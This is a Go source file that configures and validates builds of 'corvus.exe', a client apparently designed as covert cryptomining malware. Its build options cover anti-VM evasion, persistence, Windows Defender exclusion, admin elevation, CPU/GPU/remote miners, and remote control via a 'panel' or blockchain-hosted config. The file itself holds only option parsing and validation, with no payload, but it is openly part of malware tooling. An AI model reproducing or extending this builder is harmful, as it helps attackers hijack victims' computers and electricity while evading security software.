package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// BuildConfig holds every knob that affects the produced client binary.
// The zero value is not usable; call defaultBuildConfig first.
type BuildConfig struct {
	// Runtime configuration sources (at least one is required).
	PanelURLs       string // POST config mode: panel submit URL(s)
	ConfigURLs      string // GET config mode: static config URL(s)
	ContractAddress string // on-chain config URL lookup (0x...)

	// Embedded fallback config: "auto", "none" or a path to a JSON file.
	EmbeddedConfig string

	// Compile-time features.
	AntiVM            bool
	Persistence       bool
	DebugConsole      bool
	AdminManifest     bool
	DefenderExclusion bool
	CPUMiner          bool
	GPUMiner          bool
	RemoteMiners      bool

	// Process monitoring is driven by the panel config at runtime; the flag is
	// accepted for panel compatibility and reported back, not compiled in.
	Monitoring bool

	// Build behaviour.
	Output    string
	Name      string
	Source    string
	Toolchain string
	Jobs      int
	Timeout   time.Duration
	KeepBuild bool
	DryRun    bool
}

func defaultBuildConfig() BuildConfig {
	return BuildConfig{
		EmbeddedConfig: "auto",
		CPUMiner:       true,
		GPUMiner:       false,
		Output:         "dist",
		Name:           "corvus.exe",
		Jobs:           runtime.NumCPU(),
		Timeout:        30 * time.Minute,
	}
}

var contractAddressRe = regexp.MustCompile(`^0x[0-9a-fA-F]{40}$`)

// Validate checks the configuration before any build work is done.
func (c *BuildConfig) Validate() error {
	c.PanelURLs = strings.TrimSpace(c.PanelURLs)
	c.ConfigURLs = strings.TrimSpace(c.ConfigURLs)
	c.ContractAddress = strings.TrimSpace(c.ContractAddress)

	if _, err := splitURLs(c.PanelURLs); err != nil {
		return fmt.Errorf("-panel-urls: %w", err)
	}
	if _, err := splitURLs(c.ConfigURLs); err != nil {
		return fmt.Errorf("-config-url: %w", err)
	}
	if c.ContractAddress != "" && !contractAddressRe.MatchString(c.ContractAddress) {
		return fmt.Errorf("-contract-address must be a 0x-prefixed 20-byte address, got %q", c.ContractAddress)
	}
	if c.ContractAddress != "" && c.ConfigURLs != "" {
		return errors.New("-contract-address and -config-url are mutually exclusive")
	}
	if c.PanelURLs == "" && c.ConfigURLs == "" && c.ContractAddress == "" {
		return errors.New("no config source: pass -panel-urls, -config-url or -contract-address")
	}
	if !c.CPUMiner && !c.GPUMiner && !c.RemoteMiners {
		return errors.New("no miner selected: enable -cpu-miner, -gpu-miner or -remote-miners")
	}

	c.Output = strings.TrimSpace(c.Output)
	if c.Output == "" {
		c.Output = "dist"
	}
	if c.Name == "" {
		return errors.New("-name cannot be empty")
	}
	if filepath.Base(c.Name) != c.Name {
		return fmt.Errorf("-name must be a file name, not a path: %q", c.Name)
	}
	if c.Jobs < 1 {
		return fmt.Errorf("-jobs must be >= 1, got %d", c.Jobs)
	}
	if c.Timeout <= 0 {
		c.Timeout = 30 * time.Minute
	}

	switch c.EmbeddedConfig {
	case "", "auto":
		c.EmbeddedConfig = "auto"
	case "none", "off", "false":
		c.EmbeddedConfig = "none"
	default:
		abs, err := filepath.Abs(c.EmbeddedConfig)
		if err != nil {
			return fmt.Errorf("-embedded-config: %w", err)
		}
		c.EmbeddedConfig = abs
	}
	if c.Toolchain != "" {
		abs, err := filepath.Abs(c.Toolchain)
		if err != nil {
			return fmt.Errorf("-toolchain: %w", err)
		}
		c.Toolchain = abs
	}
	c.Source = strings.TrimSpace(c.Source)
	return nil
}

// Summary is embedded in the JSON result so the panel can confirm what ran.
func (c BuildConfig) Summary() map[string]any {
	return map[string]any{
		"panel_urls":         strings.Join(splitTrimmed(c.PanelURLs), ","),
		"config_url":         strings.Join(splitTrimmed(c.ConfigURLs), ","),
		"contract_address":   c.ContractAddress,
		"embedded_config":    c.EmbeddedConfig,
		"monitoring":         c.Monitoring,
		"antivm":             c.AntiVM,
		"persistence":        c.Persistence,
		"debug_console":      c.DebugConsole,
		"admin_manifest":     c.AdminManifest,
		"defender_exclusion": c.DefenderExclusion,
		"cpu_miner":          c.CPUMiner,
		"gpu_miner":          c.GPUMiner,
		"remote_miners":      c.RemoteMiners,
		"output":             c.Output,
		"name":               c.Name,
		"jobs":               c.Jobs,
	}
}

func splitTrimmed(s string) []string {
	out := []string{}
	for _, part := range strings.Split(s, ",") {
		if p := strings.TrimSpace(part); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// splitURLs validates a comma-separated URL list. Values are injected into a
// C++ string literal, so characters that could break out of the literal are
// rejected instead of escaped.
func splitURLs(raw string) ([]string, error) {
	urls := splitTrimmed(raw)
	for _, u := range urls {
		if strings.ContainsAny(u, "\"\\") {
			return nil, fmt.Errorf("URL %q contains a quote or backslash", u)
		}
		for _, r := range u {
			if r <= 0x20 || r == 0x7f {
				return nil, fmt.Errorf("URL %q contains whitespace or control characters", u)
			}
		}
		parsed, err := url.Parse(u)
		if err != nil {
			return nil, fmt.Errorf("invalid URL %q: %w", u, err)
		}
		if parsed.Scheme != "http" && parsed.Scheme != "https" {
			return nil, fmt.Errorf("URL %q must use http:// or https://", u)
		}
		if parsed.Host == "" {
			return nil, fmt.Errorf("URL %q has no host", u)
		}
	}
	return urls, nil
}

// fileConfig mirrors the panel's build request JSON plus the extra settings
// this builder understands. Pointers distinguish "absent" from "false".
type fileConfig struct {
	PanelURLs         *string `json:"panel_urls"`
	ConfigURLs        *string `json:"config_url"`
	ConfigURLsAlt     *string `json:"config_urls"`
	ContractAddress   *string `json:"contract_address"`
	EmbeddedConfig    *string `json:"embedded_config"`
	AntiVM            *bool   `json:"antivm"`
	AntiVMAlt         *bool   `json:"anti_vm"`
	Persistence       *bool   `json:"persistence"`
	DebugConsole      *bool   `json:"debug_console"`
	AdminManifest     *bool   `json:"admin_manifest"`
	DefenderExclusion *bool   `json:"defender_exclusion"`
	CPUMiner          *bool   `json:"cpu_miner"`
	GPUMiner          *bool   `json:"gpu_miner"`
	RemoteMiners      *bool   `json:"remote_miners"`
	Monitoring        *bool   `json:"monitoring"`
	ProcessMonitoring *bool   `json:"process_monitoring"`
	Output            *string `json:"output"`
	Name              *string `json:"name"`
	Source            *string `json:"source"`
	Toolchain         *string `json:"toolchain"`
	Jobs              *int    `json:"jobs"`
	TimeoutSeconds    *int    `json:"timeout_seconds"`
	KeepBuild         *bool   `json:"keep_build"`
	DryRun            *bool   `json:"dry_run"`
}

// loadConfigFile reads a JSON build config from path, or stdin when path is "-".
func loadConfigFile(path string, stdin io.Reader) (*fileConfig, error) {
	var data []byte
	var err error
	if path == "-" {
		data, err = io.ReadAll(stdin)
	} else {
		data, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, fmt.Errorf("read config %s: %w", path, err)
	}
	var fc fileConfig
	if err := json.Unmarshal(data, &fc); err != nil {
		return nil, fmt.Errorf("parse config %s: %w", path, err)
	}
	return &fc, nil
}

func (fc *fileConfig) apply(c *BuildConfig) {
	setString := func(dst *string, v *string) {
		if v != nil {
			*dst = *v
		}
	}
	setBool := func(dst *bool, v *bool) {
		if v != nil {
			*dst = *v
		}
	}

	setString(&c.PanelURLs, fc.PanelURLs)
	if fc.ConfigURLs != nil {
		c.ConfigURLs = *fc.ConfigURLs
	} else if fc.ConfigURLsAlt != nil {
		c.ConfigURLs = *fc.ConfigURLsAlt
	}
	setString(&c.ContractAddress, fc.ContractAddress)
	setString(&c.EmbeddedConfig, fc.EmbeddedConfig)
	if fc.AntiVM != nil {
		c.AntiVM = *fc.AntiVM
	} else if fc.AntiVMAlt != nil {
		c.AntiVM = *fc.AntiVMAlt
	}
	setBool(&c.Persistence, fc.Persistence)
	setBool(&c.DebugConsole, fc.DebugConsole)
	setBool(&c.AdminManifest, fc.AdminManifest)
	setBool(&c.DefenderExclusion, fc.DefenderExclusion)
	setBool(&c.CPUMiner, fc.CPUMiner)
	setBool(&c.GPUMiner, fc.GPUMiner)
	setBool(&c.RemoteMiners, fc.RemoteMiners)
	if fc.Monitoring != nil {
		c.Monitoring = *fc.Monitoring
	} else if fc.ProcessMonitoring != nil {
		c.Monitoring = *fc.ProcessMonitoring
	}
	setString(&c.Output, fc.Output)
	setString(&c.Name, fc.Name)
	setString(&c.Source, fc.Source)
	setString(&c.Toolchain, fc.Toolchain)
	if fc.Jobs != nil {
		c.Jobs = *fc.Jobs
	}
	if fc.TimeoutSeconds != nil {
		c.Timeout = time.Duration(*fc.TimeoutSeconds) * time.Second
	}
	setBool(&c.KeepBuild, fc.KeepBuild)
	setBool(&c.DryRun, fc.DryRun)
}
